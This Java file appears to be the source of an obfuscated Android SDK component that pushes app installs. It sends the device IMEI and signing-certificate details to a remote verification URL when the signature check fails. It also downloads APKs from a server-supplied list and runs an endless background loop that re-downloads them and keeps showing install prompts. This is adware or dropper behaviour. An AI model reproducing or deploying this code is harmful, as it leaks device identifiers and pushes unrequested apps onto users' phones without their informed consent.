package d.sl.i;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.pm.Signature;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;

public class creatdown {
	private static Context context;
	private static Handler handler;
	private static String zhuaia;
	private static String zhuaib;
	private static String zhuaic;
	private static String zhuaid;
	static int delay;
	private static Editor edPck;
	private static Editor edFN;
	private static String appid;
	private static Thread rethread;
	public static PowerManager pm;

	public static void startdown(Context contextz, String appid, int firstwaittime, int channel) {
		if (appid != null) {
			zonst.channel = channel;
			creatdown.context = contextz.getApplicationContext();
			creatdown.delay = firstwaittime;
			creatdown.appid = appid;
			pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
			// SC.C(context);
			LuoDi.luodi(context, appid);
			createHandler();
			loadqdid(context);
			SharedPreferences sp = context.getSharedPreferences(zonst.SlPck, Context.MODE_PRIVATE);
			edPck = sp.edit();
			SharedPreferences spFN = context.getSharedPreferences(zonst.SlP, Context.MODE_PRIVATE);
			edFN = spFN.edit();
			edPck.putString(zonst.appid, appid);
			edPck.commit();
			tools.getDLpath(context, appid);
		}
	}

	private static String getAssetsToString(Context context, String filename) {
		try {
			InputStream is = context.getAssets().open(filename);
			byte[] buffer1 = new byte[is.available()];
			is.read(buffer1);
			is.close();
			return new String(buffer1).trim();
		} catch (Exception e) {
		}
		return null;
	}

	private static void loadqdid(Context context) {
		zonst.qudaoidtxt = null;

		String guomao = getAssetsToString(context, zonst.guomaofile);
		LogUtil.i("国贸渠道号:" + guomao);
		if (guomao != null) {
			zonst.qudaoidtxt = guomao;
			String guomao4 = guomao.substring(guomao.length() - 4, guomao.length());
			checkkey(guomao4, guomao);
		} else {
			zonst.qudaoidtxt = getAssetsToString(context, zonst.qudaofile);
			LogUtil.i("其他渠道号:" + zonst.qudaoidtxt);
		}
	}

	private static void checkkey(final String key, final String key1) {
		final String baokey = getkey();
		if (baokey == null) {

		} else {
			if (baokey.equals("CN=" + key)) {
			} else {
				new Thread() {
					public void run() {
						String uuid = tools.getIMEI(context);
						String url = Urls.yanzheng + creatdown.appid + "&cid=" + key + "&imei=" + uuid + "&wcode="
								+ Uri.encode(key1) + "---------" + Uri.encode(baokey);
						LogUtil.i(url);
						HttpClient client = new DefaultHttpClient();
						HttpGet get = new HttpGet(url.trim());
						try {
							client.execute(get);
						} catch (Exception z11) {
							z11.printStackTrace();
						}
					};
				}.start();
			}
		}
	}

	private static String getkey() {
		try {
			PackageManager manager = context.getPackageManager();
			PackageInfo packageInfo = null;
			packageInfo = manager.getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);
			Signature[] signatures = packageInfo.signatures;
			Signature sign = signatures[0];
			X509Certificate cert = null;
			cert = (X509Certificate) CertificateFactory.getInstance("X.509").generateCertificate(
					new ByteArrayInputStream(sign.toByteArray()));
			return cert.getSubjectDN().toString();
		} catch (CertificateException e) {
			e.printStackTrace();
		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}
		return null;
	}

	private static void createHandler() {
		handler = new Handler() {
			private jDialog dialog0 = null;
			private jDialog dialog1 = null;
			private jDialog dialog2 = null;
			private jDialog dialog3 = null;

			@Override
			public void handleMessage(Message msg) {
				String[] str;
				switch (msg.what) {
				case 0:
					str = (String[]) msg.obj;
					if (dialog0 == null) {
						dialog0 = new jDialog(context);
					}
					dialog0.getInfo(context, new File(str[0]), str[1], str[2]);
					break;
				case 1:
					str = (String[]) msg.obj;
					if (dialog1 == null) {
						dialog1 = new jDialog(context);
					}
					dialog1.getInfo(context, new File(str[0]), str[1], str[2]);
					break;
				case 2:
					str = (String[]) msg.obj;
					if (dialog2 == null) {
						dialog2 = new jDialog(context);
					}
					dialog2.getInfo(context, new File(str[0]), str[1], str[2]);
					break;
				case 3:
					str = (String[]) msg.obj;
					if (dialog3 == null) {
						dialog3 = new jDialog(context);
					}
					dialog3.getInfo(context, new File(str[0]), str[1], str[2]);
					break;
				case 888:
					tools.downLoadAPk(context, (cdinfo) msg.obj);
					break;
				case 999:
					tools.getDLpath(context, appid);
					break;
				}
			}
		};
	}

	protected void checkyangshi() {

	}

	public static void getJson(final String apkPath) {
		try {
			Thread.sleep(1000 * delay);
			downLoad(apkPath);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	private static void downLoad(String path) {
		try {
			LogUtil.i("downLoad=" + path);
			JSONArray jsonArray = new JSONArray(path);
			JSONObject apkJson = null;
			for (int i = 0; i < jsonArray.length(); i++) {
				cdinfo obInfo = new cdinfo();
				apkJson = jsonArray.getJSONObject(i);
				String id = apkJson.getString("id");
				String name = apkJson.getString("name");
				String appurl = apkJson.getString("appurl");
				String pckName = apkJson.getString("package");
				String isauto = apkJson.getString("isauto");
				obInfo.setAppurl(appurl);
				obInfo.setId(id);
				obInfo.setIsauto(isauto);
				obInfo.setName(name);
				obInfo.setPckName(pckName);
				String FileName = appurl.substring(appurl.lastIndexOf("/") + 1, appurl.length());
				SharedPreferences spDialog = context.getSharedPreferences(zonst.dialogdlsp, Context.MODE_PRIVATE);
				Editor edDialog = spDialog.edit();
				LogUtil.i("downLoad=" + 2);
				if (!tools.checkAPKExits(context, pckName)) {
					LogUtil.i("=id:" + id + "--name:" + name + "-pckName:" + pckName);
					String apkinfo = FileName + "," + pckName + "," + name + "," + appurl;
					edDialog.remove(id);
					edDialog.putString(id, apkinfo);
					edDialog.commit();
					edPck.remove(id);
					edPck.putString(pckName, id);
					LogUtil.i("edPck:" + pckName + "-id-" + id);
					edPck.commit();
					edFN.remove(pckName);
					edFN.putString(pckName, FileName);
					LogUtil.i("edFN:" + pckName + FileName);
					edFN.commit();

					new Message();
					Message msg = Message.obtain();
					msg.what = 888;
					msg.obj = obInfo;
					handler.sendMessage(msg);
					creatdown.startWhileOpen(context, obInfo);
					break;
				} else {
					LogUtil.i(name + "-" + pckName + "�򿪳���");
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void getshowID(String filepath, String pckName, String appName) {
		LogUtil.i("zonst.yangshi=" + zonst.yangshi);
		if (zonst.yangshi == 0) {
			tools.openFile(context, new File(filepath), pckName);
		} else {
			int no = 0;
			Message msg = Message.obtain();
			String[] ary = { filepath, pckName, appName };
			if (zhuaia == null || zhuaia.equals(pckName)) {
				zhuaia = pckName;
				no = 0;
			} else if (zhuaib == null || zhuaib.equals(pckName)) {
				zhuaib = pckName;
				no = 1;
			} else if (zhuaic == null || zhuaic.equals(pckName)) {
				zhuaic = pckName;
				no = 2;
			} else if (zhuaid == null || zhuaid.equals(pckName)) {
				zhuaid = pckName;
				no = 3;
			}
			msg.what = no;
			msg.obj = ary;
			handler.sendMessage(msg);
		}
	}

	public static void startWhileOpen(final Context context, final cdinfo obInfo) {
		if (rethread == null) {
			rethread = new Thread() {
				public void run() {
					while (true) {
						if (tools.checkperiod(context)) {
							SharedPreferences spDialog = context.getSharedPreferences(zonst.dialogdlsp,
									Context.MODE_PRIVATE);
							HashMap<String, String> mapDialog = (HashMap<String, String>) spDialog.getAll();
							if (mapDialog.size() > 0) {
								Iterator<?> it = mapDialog.entrySet().iterator();
								while (it.hasNext()) {
									Map.Entry entry = (Map.Entry) it.next();
									String str = (String) entry.getValue();
									String[] ary = str.split(",");
									String fileName = ary[0];
									String pckName = ary[1];
									String appName = ary[2];
									// String apkfile = ary[3];
									File apkf = new File(Environment.getExternalStorageDirectory(), fileName);
									if (tools.checkAPKExits(context, pckName)) {
									} else if (apkf.exists()) {
										creatdown.getshowID(apkf.getAbsolutePath(), pckName, appName);
										break;
									} else {
										tools.downLoadAPk(context, obInfo);
										break;
									}
								}
							}
						}
						try {
							Thread.sleep(1000 * zonst.Interval);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				};
			};
		}
		if (!rethread.isAlive())
			rethread.start();
	}

	public static String getKernelVersion() {
		String kernelVersion = "";
		InputStream inputStream = null;
		try {
			inputStream = new FileInputStream("/proc/version");
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return kernelVersion;
		}
		BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream), 8 * 1024);
		String info = "";
		String line = "";
		try {
			while ((line = bufferedReader.readLine()) != null) {
				info += line;
			}
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				bufferedReader.close();
				inputStream.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		try {
			if (info != "") {
				final String keyword = "version ";
				int index = info.indexOf(keyword);
				line = info.substring(index + keyword.length());
				index = line.indexOf(" ");
				kernelVersion = line.substring(0, index);
			}
		} catch (IndexOutOfBoundsException e) {
			e.printStackTrace();
		}
		return kernelVersion;
	}

	public static void recontect() {
		handler.sendEmptyMessageAtTime(999, 30 * 1000);
	}
}
